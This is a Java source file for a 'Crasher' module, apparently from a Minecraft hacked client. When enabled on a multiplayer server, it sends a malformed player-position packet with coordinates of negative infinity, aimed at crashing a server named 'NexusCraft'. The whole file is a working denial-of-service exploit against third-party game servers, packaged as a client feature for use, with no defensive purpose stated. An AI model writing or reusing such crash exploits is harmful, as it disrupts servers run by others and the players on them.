package fr.ambient.module.impl.misc;

import fr.ambient.module.Module;
import fr.ambient.module.ModuleCategory;
import fr.ambient.property.impl.ModeProperty;
import fr.ambient.util.packet.PacketUtil;
import net.minecraft.network.play.client.C03PacketPlayer;

public class Crasher extends Module {
    public Crasher() {
        super(93, ModuleCategory.MISC);
        registerProperties(mode);
    }


    private ModeProperty mode = ModeProperty.newInstance("Mode", new String[]{"NexusCraft"}, "NexusCraft");

    public void onEnable(){
        if(mc.thePlayer == null || mc.isSingleplayer()){
            this.setEnabled(false);
            return;
        }

        switch (mode.getValue()){
            case "NexusCraft" -> PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
        }
        this.setEnabled(false);
    }
}
